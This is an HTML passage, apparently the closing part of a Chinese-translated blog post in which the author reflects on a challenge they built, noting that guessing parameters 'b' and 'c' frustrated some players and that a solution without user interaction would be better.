translated">首先，在创建这个挑战的过程中，我学到了很多这个挑战中用到的概念。</li><li id="ab28" class="nu nv iq ke b kf od kj oe kn of kr og kv oh kz nz oa ob oc bi translated">不是每个人都喜欢在挑战中猜测事情(参考参数<code class="fe mj mk ml mm b">b</code>和<code class="fe mj mk ml mm b">c</code>)</li><li id="4f7a" class="nu nv iq ke b kf od kj oe kn of kr og kv oh kz nz oa ob oc bi translated">没有用户交互的解决方案会更好</li></ul></div></div>    
</body>
</html>